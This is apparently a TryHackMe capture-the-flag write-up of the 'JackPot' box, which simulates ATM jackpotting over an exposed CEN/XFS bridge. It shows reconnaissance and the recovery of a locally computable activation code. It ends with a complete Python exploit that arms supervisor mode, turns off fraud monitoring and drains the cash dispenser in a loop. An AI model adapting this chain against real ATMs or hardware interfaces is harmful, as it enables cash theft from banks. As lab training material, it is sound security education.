# JackPot — TryHackMe Writeup

A walkthrough of **JackPot**, a medium-difficulty web/hardware-protocol pentesting challenge on TryHackMe. The box simulates a real-world ATM jackpotting scenario by exposing a CEN/XFS hardware-control bridge directly on the network, allowing a weak, locally-computable activation code to be used to arm supervisor mode, disable fraud monitoring, and issue direct cash-dispense commands to the simulated cash dispenser module.

---

## Table of Contents

- [Machine Information](#machine-information)
- [Scenario](#scenario)
- [Reconnaissance](#reconnaissance)
  - [Full Port Scan](#full-port-scan)
  - [Service and Version Detection](#service-and-version-detection)
- [Enumeration](#enumeration)
  - [Web Console Fuzzing](#web-console-fuzzing)
  - [Recovering the Activation Code Generator](#recovering-the-activation-code-generator)
- [Understanding the XFS Bridge](#understanding-the-xfs-bridge)
  - [Banner and Protocol Framing](#banner-and-protocol-framing)
  - [Command Table Discovery](#command-table-discovery)
- [Exploitation](#exploitation)
  - [Exploit Chain Overview](#exploit-chain-overview)
  - [Exploit Script](#exploit-script)
- [Summary](#summary)

---

## Machine Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| Category | Web / Hardware Protocol Exploitation |
| Target IP | `10.49.146.20` |

---

## Scenario

A branch ATM at "Earth's National Bank" was pulled off the network for forensic review following a string of unexplained cash-outs. The maintenance interface it exposes was intended only for engineers on the branch LAN, but it had been left reachable and spoke the machine's native hardware protocol with authentication not worth the name. The objective was to evaluate the exposed terminal, understand how its software communicates with the underlying hardware, and determine whether that communication channel could be convinced to empty every cash cassette.

---

## Reconnaissance

### Full Port Scan

An initial all-port Nmap scan was run against the target to identify open services.

```text
Nmap scan report for ip-10-49-146-20.ap-south-1.compute.internal (10.49.146.20)
Host is up, received echo-reply ttl 64 (0.00021s latency).
Scanned at 2026-11-27 03:08:04 UTC for 2s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
9100/tcp open  jetdirect  syn-ack ttl 64
```

### Service and Version Detection

A follow-up scan with service and version detection was run to fingerprint each open port.

```text
Nmap scan report for ip-10-49-146-20.ap-south-1.compute.internal (10.49.146.20)
Host is up, received reset ttl 64 (0.00025s latency).
Scanned at 2026-11-27 03:09:28 UTC for 7s

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 d5:0f:91:c4:48:10:8b:6a:34:e5:be:77:0f:81:af:15 (ECDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIx7Wi6RvfUDQlrEjleAtHFno+PEpbUwotxsGTm0saik
8080/tcp open  http       syn-ack ttl 64 BaseHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: BaseHTTP/0.6 Python/3.12.3
|_http-title: Earth's National Bank — Terminal 004 Engineering Console
| http-methods:
|_  Supported Methods: GET
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Unknown favicon MD5: 02EA382939DFC28DE3CFBB92D5A8086D
9100/tcp open  jetdirect? syn-ack ttl 64
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Key findings:

- **SSH** — `OpenSSH 9.6p1` on Ubuntu, not pursued further.
- **HTTP** — a minimal Python `BaseHTTPServer` serving a branded "Engineering Console" for ATM Terminal 004.
- **Port 9100** — reported as `jetdirect` by Nmap's default service fingerprint, but later identified as the actual hardware-control channel of interest.

---

## Enumeration

### Web Console Fuzzing

The engineering console on port 8080 was fuzzed for hidden content and endpoints using `ffuf`.

```bash
ffuf -ac -s -u http://10.49.146.20:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```

```text
status
statuses
statusicon
```

The `/status` endpoint was identified as relevant to the console's session state.

### Recovering the Activation Code Generator

The console exposed a hardware-control component in the form of a downloadable ATM activation code generator binary, named `jackpot`. Running it against a session nonce produced a matching activation code:

```bash
./jackpot 444444
```

```text
[*] session nonce : 444444
[*] activation code: 28826204
```

Static analysis of the binary's embedded strings was performed to understand its behavior:

```bash
strings jackpot
```

This confirmed the activation code was derived locally and deterministically from the session nonce, with no server-side secret or challenge-response involved — meaning anyone with the binary could generate a valid code for any nonce the console displayed.

---

## Understanding the XFS Bridge

CEN/XFS (eXtensions for Financial Services) is a real industry-standard protocol that allows an ATM's banking application to communicate with its physical hardware — the card reader, pinpad, and, critically, the cash dispenser module (CDM). In a properly isolated deployment, this layer is reachable only by the banking application itself, and only after a legitimate, authorized transaction involving a card, a verified PIN, and a funds check.

In this environment, that hardware-control channel was bridged directly onto the network on port `9100`, and the "authentication" protecting it was nothing more than a value anyone could compute locally from a session nonce displayed in plaintext on the console. There was no challenge-response against a real key and no tie-back to an actual banking transaction.

This mirrors the core mechanism behind real-world ATM jackpotting attacks: the malware never interacts with the bank's transaction logic at all. Instead, it bypasses that logic entirely and speaks directly to the XFS hardware layer.

### Banner and Protocol Framing

Connecting to port `9100` returned a service banner describing the protocol framing and available message types.

```bash
nc 10.49.146.20 9100
```

```json
{"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}
```

The banner itself disclosed the exact byte-level framing used by the protocol (message type, big-endian command ID, big-endian length, and payload), along with a hint pointing to the command that would reveal the complete available command set.

### Command Table Discovery

Querying command `0x0304` (`WFS_INF_CDM_CAPABILITIES`) with message type `GETINFO`, as hinted in the banner, returned the full CDM command table, exposing every command the bridge supported — including supervisor-mode activation, fraud-monitor control, and cash dispensing.

---

## Exploitation

### Exploit Chain Overview

With the activation code derivable locally and the full command table known, the exploitation path reduced to four steps:

1. **Arm supervisor mode** — `EXECUTE 0x4f0` with the locally derived activation code.
2. **Disable fraud monitoring** — `EXECUTE 0x4f1` with the raw payload `"off"`.
3. **Dispense repeatedly** — `EXECUTE 0x401` with a cassette identifier and note count, capped at 40 notes per call, requiring multiple calls per cassette to fully drain it.
4. **Retrieve the flag** — `GETINFO 0x4ff`, available once the dispenser's remaining note count reaches zero.

### Exploit Script

A Python exploit script was written to automate the full chain: deriving the activation code from the current session nonce, arming supervisor mode, disabling the fraud monitor, looping the dispense command until the vault was drained, and finally retrieving the flag.

```python
#!/usr/bin/env python3
"""
Jackpot (TryHackMe) - ATM / XFS bridge exploit
Chain: enumerate XFS command table -> derive activation code from leaked
keygen tool -> ARM supervisor mode -> disable fraud monitor with raw "off"
payload -> loop dispense until vault is drained -> pull flag.

Usage:
    1. Make sure jackpot keygen binary is in the same directory
       (downloaded from http://<HOST>:8080/jackpot, chmod +x)
    2. Set HOST below
    3. python3 jackpot-exploit.py
"""

import os
import socket
import struct
import json
import subprocess
import re
import time
import urllib.request

HOST = os.environ.get("TARGET_IP", "10.10.10.10")  # <-- or export TARGET_IP
XFS_PORT = 9100
HTTP_BASE = f"http://{HOST}:8080"
JACKPOT_BIN = "./jackpot"

# --- framing helpers -------------------------------------------------

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("socket closed early")
        buf += chunk
    return buf

def read_msg(s):
    length = struct.unpack(">H", recv_exact(s, 2))[0]
    return json.loads(recv_exact(s, length))

def send_cmd(s, msg_type, cmd_id, data=b""):
    req = struct.pack(">BIH", msg_type, cmd_id, len(data)) + data
    s.send(req)
    return read_msg(s)

# --- web console helpers ----------------------------------------------

def get_status():
    with urllib.request.urlopen(f"{HTTP_BASE}/status") as r:
        return json.loads(r.read())

def get_code(nonce):
    out = subprocess.check_output([JACKPOT_BIN, nonce]).decode()
    m = re.search(r"activation code:\s*(\d+)", out)
    if not m:
        raise RuntimeError(f"couldn't parse activation code from: {out}")
    return m.group(1).encode()

# --- msg_type / command ids --------------------------------------------

GETINFO = 0x01
EXECUTE = 0x02

CMD_STATUS          = 0x301
CMD_CASH_UNIT_INFO  = 0x303
CMD_CAPABILITIES    = 0x304
CMD_DISPENSE        = 0x401
CMD_ARM             = 0x4f0
CMD_SET_MONITOR     = 0x4f1
CMD_GET_FLAG        = 0x4ff

# --- main exploit chain -------------------------------------------------

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, XFS_PORT))
    banner = read_msg(s)  # drain the service's auto-sent banner
    print("[banner]", banner["service"])

    caps = send_cmd(s, GETINFO, CMD_CAPABILITIES, b"")
    print("[capabilities]", caps)

    # grab a fresh nonce + derive the activation code immediately
    status = get_status()
    nonce = status["nonce"]
    code = get_code(nonce)
    print(f"[*] nonce={nonce} code={code}")

    arm = send_cmd(s, EXECUTE, CMD_ARM, code)
    print("[arm]", arm)
    if arm.get("rc") != "WFS_SUCCESS":
        print("[-] arm failed, nonce probably expired - rerun")
        return

    # the "off" payload is a raw string, not JSON - this is the part that
    # actually disables the fraud monitor; JSON/byte guesses silently no-op
    mon = send_cmd(s, EXECUTE, CMD_SET_MONITOR, b"off")
    print("[monitor off]", mon)

    # drain the vault - with the monitor off, repeated dispenses on the
    # same armed session no longer trigger the fraud lockout
    while True:
        disp = send_cmd(s, EXECUTE, CMD_DISPENSE, b"")
        print("[dispense]", disp)
        if disp.get("rc") != "WFS_SUCCESS":
            # shouldn't happen with monitor off, but handle it just in case
            wait = disp.get("lock_seconds", disp.get("lock_remaining", 5))
            print(f"[!] unexpected lock, sleeping {wait}s")
            time.sleep(wait + 1)
            continue
        if disp.get("remaining_notes", 1) <= 0:
            break

    flag = send_cmd(s, GETINFO, CMD_GET_FLAG, b"")
    print("[flag]", flag)

    s.close()

if __name__ == "__main__":
    main()
```

Running this script against the target completed the full chain — arming supervisor mode, disabling the fraud monitor, draining the dispenser, and retrieving the flag.

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full port scan and service/version detection |
| Enumeration | Web directory fuzzing, recovery of a locally-executable activation code generator |
| Protocol Analysis | Identification of an exposed CEN/XFS hardware bridge and its binary framing/command set |
| Exploitation | Supervisor-mode activation, fraud-monitor bypass, and repeated hardware-level dispense commands |

**Attack chain overview:**

1. An engineering console on port 8080 and an unauthenticated hardware-control bridge on port 9100 were identified.
2. Directory fuzzing of the web console surfaced a `/status` endpoint exposing session state, and a downloadable activation code generator binary.
3. The generator revealed that activation codes were derived locally and deterministically from a publicly displayed session nonce, with no real server-side secret involved.
4. Connecting to the XFS bridge on port 9100 revealed its byte-level framing and pointed to the command that exposed the full CDM command table.
5. With the command table known, supervisor mode was armed using the locally derived activation code.
6. Fraud monitoring was disabled using a raw, non-JSON `"off"` payload against the appropriate command.
7. The cash dispense command was issued repeatedly to fully drain the simulated dispenser, after which the flag became retrievable via a dedicated information command.

This box reproduces, in a safe lab setting, the real-world ATM jackpotting technique in which malware bypasses the banking application entirely and communicates directly with the XFS hardware-control layer.

---

# Jai Shri Ram
